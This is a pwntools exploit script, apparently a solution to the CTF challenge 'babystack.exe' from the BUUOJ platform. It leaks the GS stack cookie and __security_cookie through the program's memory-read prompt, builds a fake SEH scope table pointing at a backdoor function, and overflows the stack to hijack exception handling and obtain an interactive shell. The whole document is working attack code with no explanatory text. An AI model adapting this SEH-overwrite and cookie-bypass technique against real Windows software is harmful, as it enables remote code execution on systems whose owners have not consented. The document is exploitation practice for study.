from pwn import *
import sys
from os import *

#context.log_level = 'debug'
context.arch = 'i386'

main = 0x10b0
target = 0x139b
__security_cookie_offset = 0x4004
backdoor = 0x138d
handler = 0x1460

#p = remote('node4.buuoj.cn', 27957)
p = process("./babystack.exe")
# p = remote('node3.buuoj.cn', 26510)

p.recvuntil("stack address = 0x")
stack_address = int(p.recv(8), 16)
cookie_address = stack_address + 0x80
p.recvuntil("main address = 0x")
main_address = int(p.recv(6), 16)
target_address = main_address - main + target
__security_cookie_address = main_address - main + __security_cookie_offset
backdoor_address = main_address - main + backdoor
exception_handler = main_address - main + handler

# leak cookie
p.sendlineafter("Do you want to know more?", "yes")
p.sendlineafter("Where do you want to know", str(cookie_address))
p.recvuntil("value is 0x")
cookie = int(p.recv(8), 16)

# leak __security_cookie
p.sendlineafter("Do you want to know more?", "yes")
p.sendlineafter("Where do you want to know", str(__security_cookie_address))
p.recvuntil("value is 0x")
__security_cookie = int(p.recv(8), 16)

# fake scope table
p.sendlineafter("Do you want to know more?", "go")
payload = b'AAAA'
# | __security_cookieCookieOffset | __security_cookieCookieXorOffset | EHCookieOffset | EHCookieXorOffset |
payload += p32(0xffffffe4) 
payload += p32(0) 
payload += p32(0xffffff20) 
payload += p32(0) 
# | EnclosingLevel | FilterFunc | HandlerFunc |
payload += p32(0xfffffffe) 
payload += p32(backdoor_address)

payload = payload.ljust(0x80, b'A') # padding

payload += p32(cookie) # GS cookie
payload += p32(0) * 2 # padding

# | next | exception_handler | scope_table ^ security_cookie | TryLevel |
payload += p32(stack_address + 0xd4) + p32(exception_handler) + p32(__security_cookie ^ (stack_address + 4)) + p32(0)

p.sendline(payload)
p.sendlineafter("Do you want to know more?", 'yes')
p.sendlineafter("Where do you want to know", '1')

p.interactive()